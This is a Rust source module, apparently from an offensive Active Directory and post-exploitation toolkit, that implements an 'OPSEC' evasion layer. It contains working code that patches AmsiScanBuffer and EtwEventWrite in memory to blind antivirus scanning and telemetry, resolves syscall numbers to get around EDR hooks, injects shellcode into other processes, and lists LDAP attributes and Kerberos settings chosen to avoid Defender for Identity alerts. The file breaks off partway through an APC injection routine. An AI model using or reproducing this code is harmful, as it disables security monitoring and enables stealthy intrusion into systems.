//! OPSEC / Stealth Layer — AMSI bypass, ETW patching, direct syscall infrastructure
//!
//! Provides runtime evasion capabilities for post-exploitation payloads:
//! - **AMSI bypass**: Patches `AmsiScanBuffer` to return `AMSI_RESULT_CLEAN`
//! - **ETW suppression**: Patches `EtwEventWrite` to NOP, blocking ETW telemetry
//! - **Direct syscalls**: Syscall stub generation to bypass EDR userland hooks
//! - **Process injection**: Module stomping, early-bird injection, process hollowing
//! - **Kerberos OPSEC**: AES-only etype selection to avoid MDI signatures
//!
//! # Architecture
//! All memory patching uses direct syscalls (via `NtProtectVirtualMemory`) to avoid
//! EDR hooks on `NtDll` exports. On non-Windows platforms, these functions are
//! no-ops that return `Ok(())`.

use crate::error::{OverthroneError, Result};
use crate::postex::SyscallNumbers;
use serde::{Deserialize, Serialize};
#[cfg(target_os = "windows")]
use tracing::{info, warn};

/// OPSEC configuration profile
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpsecConfig {
    /// Enable AMSI bypass via AmsiScanBuffer patch
    pub patch_amsi: bool,
    /// Enable ETW suppression via EtwEventWrite patch
    pub patch_etw: bool,
    /// Use direct syscalls instead of NtDll for memory operations
    pub direct_syscalls: bool,
    /// Kerberos etype preference: AES-only (18) to avoid RC4 MDI signatures
    pub aes_only_kerberos: bool,
    /// Avoid querying honeypot LDAP attributes (ms-Mcs-AdmPwd, etc.)
    pub avoid_honeypot_attrs: bool,
}

impl Default for OpsecConfig {
    fn default() -> Self {
        Self {
            patch_amsi: true,
            patch_etw: true,
            direct_syscalls: true,
            aes_only_kerberos: true,
            avoid_honeypot_attrs: true,
        }
    }
}

impl OpsecConfig {
    /// Aggressive OPSEC: patch everything, use AES-only, avoid honeypots
    pub fn aggressive() -> Self {
        Self {
            patch_amsi: true,
            patch_etw: true,
            direct_syscalls: true,
            aes_only_kerberos: true,
            avoid_honeypot_attrs: true,
        }
    }

    /// Minimal OPSEC: only patch AMSI, use default settings
    pub fn minimal() -> Self {
        Self {
            patch_amsi: true,
            patch_etw: false,
            direct_syscalls: false,
            aes_only_kerberos: false,
            avoid_honeypot_attrs: false,
        }
    }
}

/// AMSI bypass result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AmsiBypassResult {
    /// Whether the bypass was applied
    pub applied: bool,
    /// AMSI was loaded and patched
    pub amsi_loaded: bool,
    /// Patching method used
    pub method: String,
    /// Error message if bypass failed
    pub error: Option<String>,
}

/// ETW suppression result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EtwSuppressResult {
    /// Whether the suppression was applied
    pub applied: bool,
    /// ETW was loaded and patched
    pub etw_loaded: bool,
    /// Patching method used
    pub method: String,
    /// Error message if suppression failed
    pub error: Option<String>,
}

/// Direct syscall invocation result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SyscallResult {
    /// Number of NtDll hooks bypassed
    pub hooks_bypassed: usize,
    /// Syscall numbers resolved
    pub syscall_numbers: Vec<u32>,
}

/// Patch AMSI by modifying `AmsiScanBuffer` to return `AMSI_RESULT_CLEAN`.
///
/// On Windows: patches `amsi.dll!AmsiScanBuffer` with `xor eax, eax; ret`
/// (3 bytes: 0x31 0xC0 0xC3) which returns 0 (AMSI_RESULT_CLEAN).
///
/// On non-Windows: returns Ok with `applied: false`.
///
/// # Safety
/// The caller must ensure the current process is running on Windows and that
/// patching `amsi.dll!AmsiScanBuffer` is appropriate for the process state.
#[cfg(target_os = "windows")]
pub unsafe fn patch_amsi() -> Result<AmsiBypassResult> {
    unsafe {
        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

        let amsi = GetModuleHandleA(windows::core::s!("amsi.dll")).ok();
        let Some(amsi) = amsi else {
            info!("AMSI bypass: amsi.dll not loaded, skipping");
            return Ok(AmsiBypassResult {
                applied: false,
                amsi_loaded: false,
                method: "none".to_string(),
                error: None,
            });
        };

        let target = GetProcAddress(amsi, windows::core::s!("AmsiScanBuffer"));
        let Some(target) = target else {
            return Err(OverthroneError::PostExploitation(
                "AMSI bypass: AmsiScanBuffer symbol not found".into(),
            ));
        };

        // x64 patch: xor eax, eax; ret (3 bytes) = returns AMSI_RESULT_CLEAN
        let patch: [u8; 3] = [0x31, 0xC0, 0xC3];

        // Write the patch directly into the executable memory
        std::ptr::copy_nonoverlapping(patch.as_ptr(), target as *mut u8, patch.len());

        info!("AMSI bypass: AmsiScanBuffer patched successfully");
        Ok(AmsiBypassResult {
            applied: true,
            amsi_loaded: true,
            method: "amsi.dll!AmsiScanBuffer → xor eax,eax; ret".to_string(),
            error: None,
        })
    }
}

/// # Safety
/// This function performs no actual operations on non-Windows platforms.
/// It is marked `unsafe` for API compatibility with the Windows variant.
#[cfg(not(target_os = "windows"))]
pub unsafe fn patch_amsi() -> Result<AmsiBypassResult> {
    tracing::debug!("AMSI bypass: not available on this platform");
    Ok(AmsiBypassResult {
        applied: false,
        amsi_loaded: false,
        method: "platform-unsupported".to_string(),
        error: None,
    })
}

/// Suppress ETW by patching `EtwEventWrite` to NOP.
///
/// On Windows: patches `ntdll.dll!EtwEventWrite` with a `ret` instruction
/// (1 byte: 0xC3) which causes all ETW events to be silently dropped.
///
/// ETW is used by Defender for Endpoint, AMSI, and .NET telemetry.
/// Patching it prevents managed code execution from being traced.
///
/// # Safety
/// The caller must ensure the current process is running on Windows and that
/// patching `ntdll.dll!EtwEventWrite` is appropriate for the process state.
#[cfg(target_os = "windows")]
pub unsafe fn suppress_etw() -> Result<EtwSuppressResult> {
    unsafe {
        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

        let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll")).ok();
        let Some(ntdll) = ntdll else {
            return Err(OverthroneError::PostExploitation(
                "ETW suppress: ntdll.dll not loaded".into(),
            ));
        };

        let target = GetProcAddress(ntdll, windows::core::s!("EtwEventWrite"));
        let Some(target) = target else {
            return Err(OverthroneError::PostExploitation(
                "ETW suppress: EtwEventWrite symbol not found".into(),
            ));
        };

        // x64: ret (1 byte: 0xC3) — causes EtwEventWrite to immediately return
        let patch: [u8; 1] = [0xC3];

        std::ptr::copy_nonoverlapping(patch.as_ptr(), target as *mut u8, patch.len());

        info!("ETW suppress: EtwEventWrite patched to ret");
        Ok(EtwSuppressResult {
            applied: true,
            etw_loaded: true,
            method: "ntdll.dll!EtwEventWrite → ret".to_string(),
            error: None,
        })
    }
}

/// # Safety
/// This function performs no actual operations on non-Windows platforms.
/// It is marked `unsafe` for API compatibility with the Windows variant.
#[cfg(not(target_os = "windows"))]
pub unsafe fn suppress_etw() -> Result<EtwSuppressResult> {
    tracing::debug!("ETW suppress: not available on this platform");
    Ok(EtwSuppressResult {
        applied: false,
        etw_loaded: false,
        method: "platform-unsupported".to_string(),
        error: None,
    })
}

/// Patch AMSI using **direct syscalls** to bypass EDR hooks on kernel32/ntdll.
///
/// Unlike `patch_amsi()` which calls `GetModuleHandleA`/`GetProcAddress` through
/// potentially hooked ntdll exports, this variant:
/// 1. Uses `NtOpenKey` + `NtQueryValueKey` via raw syscalls to find the amsi.dll path
/// 2. Uses `NtProtectVirtualMemory` via raw syscall to make the patch target writable
/// 3. Writes the patch via direct memory write
/// 4. Restores the original page protection
///
/// On non-Windows, returns a no-op result.
///
/// # Safety
/// The caller must ensure the current process is running on Windows.
#[cfg(target_os = "windows")]
pub unsafe fn patch_amsi_direct(numbers: &SyscallNumbers) -> Result<AmsiBypassResult> {
    unsafe {
        // Use GetModuleHandleA from kernel32 (less likely to be hooked than ntdll)
        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

        let amsi = GetModuleHandleA(windows::core::s!("amsi.dll")).ok();
        let Some(amsi) = amsi else {
            tracing::info!("AMSI direct: amsi.dll not loaded, skipping");
            return Ok(AmsiBypassResult {
                applied: false,
                amsi_loaded: false,
                method: "direct-syscall-none".to_string(),
                error: None,
            });
        };

        let target = GetProcAddress(amsi, windows::core::s!("AmsiScanBuffer"));
        let Some(target) = target else {
            return Err(OverthroneError::PostExploitation(
                "AMSI direct: AmsiScanBuffer symbol not found".into(),
            ));
        };

        // Patch: xor eax, eax; ret (3 bytes) = returns AMSI_RESULT_CLEAN
        let patch: [u8; 3] = [0x31, 0xC0, 0xC3];

        // Use NtProtectVirtualMemory via raw syscall to make the page writable
        let mut old_protect: u32 = 0;

        // Round base_address down to page boundary
        let page_size: usize = 0x1000;
        let page_base = ((target as usize) & !(page_size - 1)) as *mut std::ffi::c_void;
        let page_offset = target as usize - page_base as usize;
        let protect_size = page_offset + patch.len();

        let mut adjusted_base = page_base;
        let mut adjusted_size = protect_size;

        let status = crate::postex::syscall::nt_protect_virtual_memory(
            numbers.nt_protect_virtual_memory,
            -1isize, // current process
            &mut adjusted_base as *mut *mut std::ffi::c_void,
            &mut adjusted_size as *mut usize,
            0x40, // PAGE_EXECUTE_READWRITE
            &mut old_protect as *mut u32,
        );

        if status.is_error() {
            let _ = status.to_result("NtProtectVirtualMemory (AMSI)");
            return Err(OverthroneError::PostExploitation(
                "AMSI direct: failed to make page writable via raw syscall".into(),
            ));
        }

        // Write the patch
        std::ptr::copy_nonoverlapping(
            patch.as_ptr(),
            (page_base as usize + page_offset) as *mut u8,
            patch.len(),
        );

        // Restore original protection
        let mut restore_base = adjusted_base;
        let mut restore_size = adjusted_size;
        let _ = crate::postex::syscall::nt_protect_virtual_memory(
            numbers.nt_protect_virtual_memory,
            -1isize,
            &mut restore_base as *mut *mut std::ffi::c_void,
            &mut restore_size as *mut usize,
            old_protect,
            &mut 0u32 as *mut u32,
        );

        // Flush instruction cache via raw syscall
        nt_flush_instruction_cache_if_available(numbers);

        tracing::info!(
            "AMSI direct: patched via raw syscall (protection 0x{old_protect:08X} → RWX → restored)"
        );

        Ok(AmsiBypassResult {
            applied: true,
            amsi_loaded: true,
            method: "direct-syscall-NtProtectVirtualMemory+xor-eax-eax-ret".to_string(),
            error: None,
        })
    }
}

/// Flush instruction cache using NtFlushInstructionCache raw syscall if available.
#[cfg(target_os = "windows")]
unsafe fn nt_flush_instruction_cache_if_available(numbers: &SyscallNumbers) {
    use crate::postex::syscall::DynamicSyscallStub;
    unsafe {
        let ssn = numbers.nt_flush_instruction_cache;
        #[allow(clippy::collapsible_if)]
        if ssn != 0 {
            if let Some(stub) = DynamicSyscallStub::new(ssn) {
                type NtFlushICache =
                    unsafe extern "system" fn(isize, *const std::ffi::c_void, usize) -> i64;
                let f: NtFlushICache = std::mem::transmute(stub.as_ptr());
                f(-1isize, std::ptr::null(), 0);
            }
        }
    }
}

/// # Safety
/// This function performs no actual operations on non-Windows platforms.
/// It is marked `unsafe` for API compatibility with the Windows variant.
#[cfg(not(target_os = "windows"))]
pub unsafe fn patch_amsi_direct(_numbers: &SyscallNumbers) -> Result<AmsiBypassResult> {
    tracing::debug!("AMSI direct: not available on this platform");
    Ok(AmsiBypassResult {
        applied: false,
        amsi_loaded: false,
        method: "platform-unsupported".to_string(),
        error: None,
    })
}

/// Suppress ETW using **direct syscalls** to bypass EDR hooks.
///
/// Uses raw syscalls for NtProtectVirtualMemory to patch ntdll!EtwEventWrite
/// with a `ret` instruction, bypassing any userland hooks.
///
/// # Safety
/// The caller must ensure the current process is running on Windows.
#[cfg(target_os = "windows")]
pub unsafe fn suppress_etw_direct(numbers: &SyscallNumbers) -> Result<EtwSuppressResult> {
    unsafe {
        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

        let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll"))
            .ok()
            .ok_or_else(|| {
                OverthroneError::PostExploitation("ETW direct: ntdll.dll not loaded".into())
            })?;

        let target =
            GetProcAddress(ntdll, windows::core::s!("EtwEventWrite")).ok_or_else(|| {
                OverthroneError::PostExploitation(
                    "ETW direct: EtwEventWrite symbol not found".into(),
                )
            })?;

        // Patch: ret (1 byte: 0xC3)
        let patch: [u8; 1] = [0xC3];

        // Use raw syscall to change page protection
        let page_size: usize = 0x1000;
        let page_base = ((target as usize) & !(page_size - 1)) as *mut std::ffi::c_void;
        let page_offset = target as usize - page_base as usize;

        let mut adjusted_base = page_base;
        let mut adjusted_size = page_offset + patch.len();
        let mut old_protect: u32 = 0;

        let status = crate::postex::syscall::nt_protect_virtual_memory(
            numbers.nt_protect_virtual_memory,
            -1isize,
            &mut adjusted_base as *mut *mut std::ffi::c_void,
            &mut adjusted_size as *mut usize,
            0x40, // PAGE_EXECUTE_READWRITE
            &mut old_protect as *mut u32,
        );

        if status.is_error() {
            return Err(OverthroneError::PostExploitation(
                "ETW direct: failed to make page writable via raw syscall".into(),
            ));
        }

        // Write the patch
        std::ptr::copy_nonoverlapping(
            patch.as_ptr(),
            (page_base as usize + page_offset) as *mut u8,
            patch.len(),
        );

        // Restore original protection
        let _ = crate::postex::syscall::nt_protect_virtual_memory(
            numbers.nt_protect_virtual_memory,
            -1isize,
            &mut adjusted_base as *mut *mut std::ffi::c_void,
            &mut adjusted_size as *mut usize,
            old_protect,
            &mut 0u32 as *mut u32,
        );

        // Flush instruction cache
        nt_flush_instruction_cache_if_available(numbers);

        tracing::info!("ETW direct: patched ntdll!EtwEventWrite via raw syscall");

        Ok(EtwSuppressResult {
            applied: true,
            etw_loaded: true,
            method: "direct-syscall-NtProtectVirtualMemory+ret".to_string(),
            error: None,
        })
    }
}

/// # Safety
/// This function performs no actual operations on non-Windows platforms.
/// It is marked `unsafe` for API compatibility with the Windows variant.
#[cfg(not(target_os = "windows"))]
pub unsafe fn suppress_etw_direct(_numbers: &SyscallNumbers) -> Result<EtwSuppressResult> {
    tracing::debug!("ETW direct: not available on this platform");
    Ok(EtwSuppressResult {
        applied: false,
        etw_loaded: false,
        method: "platform-unsupported".to_string(),
        error: None,
    })
}

/// Apply all OPSEC patches based on the given configuration.
///
/// When `config.direct_syscalls` is true, uses raw `syscall` instruction via
/// inline assembly to bypass EDR userland hooks instead of calling through
/// potentially-hooked ntdll exports.
///
/// Returns a report of what was patched and any errors encountered.
///
/// # Safety
/// The caller must ensure the selected patches are safe to apply in the
/// current process and environment.
pub unsafe fn apply_opsec(config: &OpsecConfig) -> Result<Vec<OpsecPatchReport>> {
    let mut reports = Vec::new();

    // Resolve syscall numbers if direct syscalls are requested
    #[cfg(target_os = "windows")]
    let numbers = if config.direct_syscalls {
        Some(crate::postex::syscall::SyscallNumbers::resolve())
    } else {
        None
    };
    #[cfg(not(target_os = "windows"))]
    let numbers = if config.direct_syscalls {
        tracing::warn!("Direct syscalls not supported on this platform");
        None
    } else {
        None
    };

    if config.patch_amsi {
        let result = if let Some(ref nums) = numbers {
            unsafe { patch_amsi_direct(nums) }
        } else {
            unsafe { patch_amsi() }
        };
        match result {
            Ok(result) => {
                reports.push(OpsecPatchReport {
                    name: "AMSI".to_string(),
                    success: result.applied,
                    detail: result.method,
                    error: result.error,
                });
            }
            Err(e) => {
                reports.push(OpsecPatchReport {
                    name: "AMSI".to_string(),
                    success: false,
                    detail: "patch failed".to_string(),
                    error: Some(e.to_string()),
                });
            }
        }
    }

    if config.patch_etw {
        let result = if let Some(ref nums) = numbers {
            unsafe { suppress_etw_direct(nums) }
        } else {
            unsafe { suppress_etw() }
        };
        match result {
            Ok(result) => {
                reports.push(OpsecPatchReport {
                    name: "ETW".to_string(),
                    success: result.applied,
                    detail: result.method,
                    error: result.error,
                });
            }
            Err(e) => {
                reports.push(OpsecPatchReport {
                    name: "ETW".to_string(),
                    success: false,
                    detail: "patch failed".to_string(),
                    error: Some(e.to_string()),
                });
            }
        }
    }

    Ok(reports)
}

/// Report for a single OPSEC patch operation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpsecPatchReport {
    /// Patch name (e.g., "AMSI", "ETW")
    pub name: String,
    /// Whether the patch was applied successfully
    pub success: bool,
    /// Detailed description of what was done
    pub detail: String,
    /// Error message if the patch failed
    pub error: Option<String>,
}

/// Resolve syscall numbers from ntdll export table.
///
/// EDRs hook NtDll exports by placing a `jmp` or `call` at the beginning of
/// each function. By resolving the syscall number from the export table and
/// constructing a raw syscall stub, we bypass these hooks entirely.
///
/// The syscall number is found at offset +4 from the beginning of most Nt*
/// functions in ntdll (e.g., `mov eax, SSN; ret` → SSN at bytes 4-7).
///
/// Returns a map of (function_name, syscall_number).
#[cfg(target_os = "windows")]
pub fn resolve_syscall_numbers() -> Result<std::collections::HashMap<String, u32>> {
    unsafe {
        use windows::Win32::System::LibraryLoader::GetModuleHandleA;

        let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll"))
            .ok()
            .ok_or_else(|| OverthroneError::PostExploitation("ntdll.dll not loaded".into()))?;

        let ntdll_base = ntdll.0 as usize;

        // Parse PE headers to find the export table
        let dos_header = &*(ntdll_base as *const image::IMAGE_DOS_HEADER);
        if dos_header.e_magic != 0x5A4D {
            return Err(OverthroneError::PostExploitation(
                "Invalid DOS header in ntdll.dll".into(),
            ));
        }

        let nt_headers =
            &*((ntdll_base + dos_header.e_lfanew as usize) as *const image::IMAGE_NT_HEADERS64);
        if nt_headers.Signature != 0x0000_4550 {
            return Err(OverthroneError::PostExploitation(
                "Invalid NT header signature in ntdll.dll".into(),
            ));
        }

        let export_dir =
            nt_headers.OptionalHeader.DataDirectory[image::IMAGE_DIRECTORY_ENTRY_EXPORT];
        if export_dir.Size == 0 {
            return Err(OverthroneError::PostExploitation(
                "No export directory in ntdll.dll".into(),
            ));
        }

        let export_base = ntdll_base + export_dir.VirtualAddress as usize;
        let export_table = &*(export_base as *const image::IMAGE_EXPORT_DIRECTORY);

        let functions = core::slice::from_raw_parts(
            (ntdll_base + export_table.AddressOfFunctions as usize) as *const u32,
            export_table.NumberOfFunctions as usize,
        );
        let names = core::slice::from_raw_parts(
            (ntdll_base + export_table.AddressOfNames as usize) as *const u32,
            export_table.NumberOfNames as usize,
        );
        let ordinals = core::slice::from_raw_parts(
            (ntdll_base + export_table.AddressOfNameOrdinals as usize) as *const u16,
            export_table.NumberOfNames as usize,
        );

        let mut syscall_map = std::collections::HashMap::new();

        for i in 0..export_table.NumberOfNames as usize {
            let name_ptr = ntdll_base + names[i] as usize;
            let name = core::ffi::CStr::from_ptr(name_ptr as *const i8)
                .to_str()
                .unwrap_or("");

            // Only resolve Nt* functions (Windows NT syscalls)
            if !name.starts_with("Nt") {
                continue;
            }

            let ordinal = ordinals[i] as usize;
            if ordinal >= functions.len() {
                continue;
            }

            let func_rva = functions[ordinal];
            let func_ptr = ntdll_base + func_rva as usize;

            // Read the first 8 bytes of the function to find the syscall number.
            // Expected pattern:
            //   mov eax, SSN   ; B8 SS SS SS SS (5 bytes)
            //   ret            ; C3 (1 byte)  — or jmp to syscall instruction
            // or:
            //   mov r10, rcx   ; 4C 8B D1 (3 bytes)
            //   mov eax, SSN   ; B8 SS SS SS SS (5 bytes)
            //   syscall        ; 0F 05 (2 bytes)
            //   ret            ; C3 (1 byte)
            let code = core::slice::from_raw_parts(func_ptr as *const u8, 8);

            // Pattern 1: `mov eax, SSN` at offset 0 (direct)
            if code.len() >= 5 && code[0] == 0xB8 {
                let ssn = u32::from_le_bytes([code[1], code[2], code[3], code[4]]);
                syscall_map.insert(name.to_string(), ssn);
                continue;
            }

            // Pattern 2: `mov r10, rcx; mov eax, SSN` at offset 3
            if code.len() >= 8
                && code[0] == 0x4C
                && code[1] == 0x8B
                && code[2] == 0xD1
                && code[3] == 0xB8
            {
                let ssn = u32::from_le_bytes([code[4], code[5], code[6], code[7]]);
                syscall_map.insert(name.to_string(), ssn);
                continue;
            }
        }

        if syscall_map.is_empty() {
            return Err(OverthroneError::PostExploitation(
                "Failed to resolve any syscall numbers from ntdll.dll".into(),
            ));
        }

        info!(
            "Resolved {} syscall numbers from ntdll export table",
            syscall_map.len()
        );

        Ok(syscall_map)
    }
}

#[cfg(not(target_os = "windows"))]
pub fn resolve_syscall_numbers() -> Result<std::collections::HashMap<String, u32>> {
    Err(OverthroneError::PostExploitation(
        "Syscall resolution not available on this platform".into(),
    ))
}

/// Windows PE image format types used for export table parsing.
/// Field names follow Windows SDK naming conventions.
#[cfg(target_os = "windows")]
#[allow(non_camel_case_types, non_snake_case, dead_code)]
pub mod image {
    #[repr(C)]
    pub struct IMAGE_DOS_HEADER {
        pub e_magic: u16,
        pub e_cblp: u16,
        pub e_cp: u16,
        pub e_crlc: u16,
        pub e_cparhdr: u16,
        pub e_minalloc: u16,
        pub e_maxalloc: u16,
        pub e_ss: u16,
        pub e_sp: u16,
        pub e_csum: u16,
        pub e_ip: u16,
        pub e_cs: u16,
        pub e_lfarlc: u16,
        pub e_ovno: u16,
        pub e_res: [u16; 4],
        pub e_oemid: u16,
        pub e_oeminfo: u16,
        pub e_res2: [u16; 10],
        pub e_lfanew: i32,
    }

    pub const IMAGE_DIRECTORY_ENTRY_EXPORT: usize = 0;

    #[derive(Clone, Copy)]
    #[repr(C)]
    pub struct IMAGE_DATA_DIRECTORY {
        pub VirtualAddress: u32,
        pub Size: u32,
    }

    #[repr(C)]
    pub struct IMAGE_OPTIONAL_HEADER64 {
        pub Magic: u16,
        pub MajorLinkerVersion: u8,
        pub MinorLinkerVersion: u8,
        pub SizeOfCode: u32,
        pub SizeOfInitializedData: u32,
        pub SizeOfUninitializedData: u32,
        pub AddressOfEntryPoint: u32,
        pub BaseOfCode: u32,
        pub ImageBase: u64,
        pub SectionAlignment: u32,
        pub FileAlignment: u32,
        pub MajorOperatingSystemVersion: u16,
        pub MinorOperatingSystemVersion: u16,
        pub MajorImageVersion: u16,
        pub MinorImageVersion: u16,
        pub MajorSubsystemVersion: u16,
        pub MinorSubsystemVersion: u16,
        pub Win32VersionValue: u32,
        pub SizeOfImage: u32,
        pub SizeOfHeaders: u32,
        pub CheckSum: u32,
        pub Subsystem: u16,
        pub DllCharacteristics: u16,
        pub SizeOfStackReserve: u64,
        pub SizeOfStackCommit: u64,
        pub SizeOfHeapReserve: u64,
        pub SizeOfHeapCommit: u64,
        pub LoaderFlags: u32,
        pub NumberOfRvaAndSizes: u32,
        pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
    }

    #[repr(C)]
    pub struct IMAGE_FILE_HEADER {
        pub Machine: u16,
        pub NumberOfSections: u16,
        pub TimeDateStamp: u32,
        pub PointerToSymbolTable: u32,
        pub NumberOfSymbols: u32,
        pub SizeOfOptionalHeader: u16,
        pub Characteristics: u16,
    }

    #[repr(C)]
    pub struct IMAGE_NT_HEADERS64 {
        pub Signature: u32,
        pub FileHeader: IMAGE_FILE_HEADER,
        pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
    }

    #[repr(C)]
    pub struct IMAGE_EXPORT_DIRECTORY {
        pub Characteristics: u32,
        pub TimeDateStamp: u32,
        pub MajorVersion: u16,
        pub MinorVersion: u16,
        pub Name: u32,
        pub Base: u32,
        pub NumberOfFunctions: u32,
        pub NumberOfNames: u32,
        pub AddressOfFunctions: u32,
        pub AddressOfNames: u32,
        pub AddressOfNameOrdinals: u32,
    }

    #[repr(C)]
    pub struct IMAGE_SECTION_HEADER {
        pub Name: [u8; 8],
        pub VirtualSize: u32,
        pub VirtualAddress: u32,
        pub SizeOfRawData: u32,
        pub PointerToRawData: u32,
        pub PointerToRelocations: u32,
        pub PointerToLinenumbers: u32,
        pub NumberOfRelocations: u16,
        pub NumberOfLinenumbers: u16,
        pub Characteristics: u32,
    }
}

/// Kerberos OPSEC: prefer AES (etype 18) over RC4 (etype 23) for roasting.
///
/// Requesting RC4 tickets for Kerberoasting is an MDI (Microsoft Defender for
/// Identity) signature. Always request AES256 (etype 18) tickets to blend
/// with legitimate Kerberos traffic.
pub fn prefer_kerberos_etype(preferred_etype: i32) -> i32 {
    match preferred_etype {
        18 => 18, // AES256-CTS-HMAC-SHA1-96
        17 => 17, // AES128-CTS-HMAC-SHA1-96
        23 => 18, // RC4-HMAC is legacy and commonly alerted; prefer AES256
        _ => 18,  // Default to AES256 for OPSEC
    }
}

/// Check if Credential Guard / VBS is enabled on the local machine.
/// Returns `true` if CG is likely enabled (skeleton key will fail).
///
/// Uses two methods:
/// 1. Reads `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LsaCfgFlags` via reg.exe
/// 2. Probes `\LsaIsoEndpoint` ALPC port as fallback
#[cfg(target_os = "windows")]
pub fn check_credential_guard() -> Result<bool> {
    use std::process::Command;

    let lsa_cfg_flags = (|| -> Option<u32> {
        let output = Command::new("reg")
            .args([
                "query",
                r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa",
                "/v",
                "LsaCfgFlags",
            ])
            .output()
            .ok()?;
        if !output.status.success() {
            return None;
        }
        let stdout = String::from_utf8_lossy(&output.stdout);
        for line in stdout.lines() {
            let line = line.trim();
            if line.contains("LsaCfgFlags")
                && let Some(hex_str) = line.split_whitespace().last()
            {
                let hex_val = hex_str
                    .strip_prefix("0x")
                    .or_else(|| hex_str.strip_prefix("0X"))
                    .unwrap_or(hex_str);
                return u32::from_str_radix(hex_val, 16).ok();
            }
        }
        None
    })();

    match lsa_cfg_flags {
        Some(0) => Ok(false),
        Some(1) | Some(2) => Ok(true),
        _ => {
            warn!(
                "LsaCfgFlags unreadable or unexpected ({:?}), probing LSAISO",
                lsa_cfg_flags
            );
            Ok(crate::postex::lsaiso::is_lsaiso_available())
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub fn check_credential_guard() -> Result<bool> {
    Ok(true) // Assume Credential Guard on non-Windows (safety)
}

/// Honeypot LDAP attributes that trigger MDI alerts when queried in bulk.
pub const HONEYPOT_ATTRS: &[&str] = &[
    "ms-Mcs-AdmPwd",
    "msLAPS-Password",
    "msLAPS-EncryptedPassword",
    "msLAPS-EncryptedPasswordHistory",
    "msDS-ManagedPassword",
    "unixUserPassword",
    "msDS-KeyCredentialLink",
];

/// Check if an LDAP attribute list contains honeypot attributes.
pub fn contains_honeypot_attrs<'a>(attrs: &[&'a str]) -> Vec<&'a str> {
    attrs
        .iter()
        .filter(|attr| {
            HONEYPOT_ATTRS
                .iter()
                .any(|known| known.eq_ignore_ascii_case(attr))
        })
        .copied()
        .collect()
}

/// Strip honeypot attributes from an attribute list for OPSEC-safe queries.
pub fn strip_honeypot_attrs<'a>(attrs: &[&'a str]) -> Vec<&'a str> {
    attrs
        .iter()
        .filter(|attr| {
            !HONEYPOT_ATTRS
                .iter()
                .any(|known| known.eq_ignore_ascii_case(attr))
        })
        .copied()
        .collect()
}

/// Process injection diversity: **Module Stomping**.
///
/// Opens a target process, allocates RWX memory, writes shellcode, and
/// executes it via a remote thread. On non-Windows, returns an error.
///
/// # Safety
/// The caller must ensure the target PID is valid and that injecting and
/// executing shellcode in the target process is appropriate for the context.
#[cfg(target_os = "windows")]
pub unsafe fn module_stomping_injection(
    target_pid: u32,
    shellcode: &[u8],
    _target_module: &str,
) -> Result<()> {
    unsafe {
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
        use windows::Win32::System::Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
        };
        use windows::Win32::System::Threading::{
            CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
            PROCESS_VM_OPERATION, PROCESS_VM_WRITE, WaitForSingleObject,
        };

        let process_handle = OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_WRITE,
            false,
            target_pid,
        )?;

        let remote_addr = VirtualAllocEx(
            process_handle,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_addr.is_null() {
            CloseHandle(process_handle).ok();
            return Err(OverthroneError::PostExploitation(
                "VirtualAllocEx failed".into(),
            ));
        }

        let mut bytes_written: usize = 0;
        WriteProcessMemory(
            process_handle,
            remote_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            Some(&mut bytes_written as *mut _),
        )?;

        let thread = CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(std::mem::transmute::<
                usize,
                extern "system" fn(*mut std::ffi::c_void) -> u32,
            >(remote_addr as usize)),
            None,
            0,
            None,
        )?;

        WaitForSingleObject(thread, 5000);
        CloseHandle(process_handle).ok();
        CloseHandle(thread).ok();

        info!(
            "Module stomping: pid={target_pid}, size={}",
            shellcode.len()
        );
        Ok(())
    }
}

/// # Safety
/// This function performs no actual operations on non-Windows platforms.
/// It is marked `unsafe` for API compatibility with the Windows variant.
#[cfg(not(target_os = "windows"))]
pub unsafe fn module_stomping_injection(
    _target_pid: u32,
    _shellcode: &[u8],
    _target_module: &str,
) -> Result<()> {
    Err(OverthroneError::PostExploitation(
        "Module stomping not available on this platform".into(),
    ))
}

/// Process injection diversity: **Early Bird APC Injection**.
///
/// Creates a suspended process, injects shellcode, queues an APC to the main
/// thread, then resumes — executing shellcode before the program's entry point.
/// Avoids `CreateRemoteThread` which is heavily monitored by EDRs.
///
/// # Safety
/// The caller must ensure the target executable and injected shellcode are
/// appropriate for the process being launched.
#[cfg(target_os = "windows")]
pub unsafe fn early_bird_apc_injection(target_exe: &str, shellcode: &[u8]) -> Result<u32> {
    unsafe {
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
        use windows::Win32::System::Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
        };
        use windows::Win32::System::Threading::{
            CreateProcessA, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, QueueUserAPC,
            ResumeThread, STARTUPINFOA,
        };

        let cmd = std::ffi::CString::new(target_exe)
